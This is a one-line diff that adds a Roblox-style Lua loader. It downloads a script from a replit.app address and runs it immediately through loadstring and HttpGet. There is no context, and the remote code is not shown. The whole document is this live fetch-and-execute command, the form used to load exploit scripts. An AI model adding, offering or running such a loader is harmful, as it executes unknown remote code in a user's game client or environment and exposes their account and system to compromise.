@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://prometheus--imthesmartercat.replit.app/s/xl8d23ha"))()
